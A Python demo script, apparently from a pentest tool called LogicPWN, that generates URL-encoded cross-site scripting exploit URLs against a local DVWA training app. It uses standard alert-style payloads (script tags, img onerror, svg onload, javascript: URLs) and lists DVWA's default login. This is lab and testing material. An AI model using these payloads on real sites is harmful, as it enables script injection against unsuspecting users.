#!/usr/bin/env python3
"""
LogicPWN XSS URL Generator
Simple example that demonstrates XSS exploit URL generation
exactly like your DVWA example.
"""

import urllib.parse

def generate_xss_exploits():
    """Generate XSS exploit URLs like your examples"""
    print("🎯 LogicPWN XSS Exploit URL Generator")
    print("=" * 50)
    
    # Base URLs for different DVWA XSS types
    base_urls = {
        "reflected": "http://localhost:8080/vulnerabilities/xss_r/",
        "stored": "http://localhost:8080/vulnerabilities/xss_s/",
        "dom": "http://localhost:8080/vulnerabilities/xss_d/"
    }
    
    # XSS payloads to test
    payloads = [
        "<script>alert('Reflected XSS')</script>",
        "<script>prompt('Stored XSS')</script>", 
        "<script>alert('DOM XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')"
    ]
    
    print("🚨 Generated XSS Exploit URLs:")
    print()
    
    for xss_type, base_url in base_urls.items():
        print(f"📋 {xss_type.upper()} XSS:")
        
        for i, payload in enumerate(payloads, 1):
            # URL encode the payload
            encoded_payload = urllib.parse.quote(payload)
            
            # Generate exploit URL based on XSS type
            if xss_type == "reflected":
                exploit_url = f"{base_url}?name={encoded_payload}"
            elif xss_type == "stored":
                exploit_url = f"{base_url}?message={encoded_payload}"
            elif xss_type == "dom":
                exploit_url = f"{base_url}?default={encoded_payload}"
                
            print(f"   {i}. {exploit_url}")
            
        print()
    
    # Show your specific example
    print("🎯 Your Example Recreated:")
    your_payload = "<script>alert('Reflected XSS')</script>"
    your_encoded = urllib.parse.quote(your_payload)
    your_url = f"http://localhost:8080/vulnerabilities/xss_r/?name={your_encoded}"
    
    print(f"Original: http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27Reflected+XSS%27%29%3C%2Fscript%3E")
    print(f"LogicPWN: {your_url}")
    print()
    
    print("✅ URL encoding comparison:")
    print(f"Manual:   %3Cscript%3Ealert%28%27Reflected+XSS%27%29%3C%2Fscript%3E")
    print(f"LogicPWN: {your_encoded}")

def show_automation_workflow():
    """Show how LogicPWN automates the XSS testing workflow"""
    print("\n🤖 LogicPWN Automation Workflow")
    print("=" * 40)
    
    workflow_steps = [
        "1. 🔐 Login to DVWA (admin/admin)",
        "2. 🎯 Access XSS vulnerability pages", 
        "3. 🚨 Send XSS payloads automatically",
        "4. 🔍 Check if payloads are reflected",
        "5. 🔗 Generate exploit URLs",
        "6. 📊 Report vulnerabilities found",
        "7. 💾 Test payload persistence (Stored XSS)",
        "8. 🌐 Test DOM manipulation (DOM XSS)"
    ]
    
    for step in workflow_steps:
        print(f"   {step}")
    
    print(f"\n💡 Benefits of automation:")
    print(f"   • Test multiple payloads quickly")
    print(f"   • Consistent testing methodology") 
    print(f"   • Automatic URL encoding")
    print(f"   • Detailed vulnerability reporting")
    print(f"   • Session management handled")

def main():
    """Run the XSS demo"""
    generate_xss_exploits()
    show_automation_workflow()
    
    print(f"\n🎉 XSS URL generation complete!")
    print(f"\nNext steps:")
    print(f"• Use these URLs to test XSS vulnerabilities")
    print(f"• Share with victims (in authorized testing)")
    print(f"• Run LogicPWN examples for full automation")

if __name__ == "__main__":
    main()
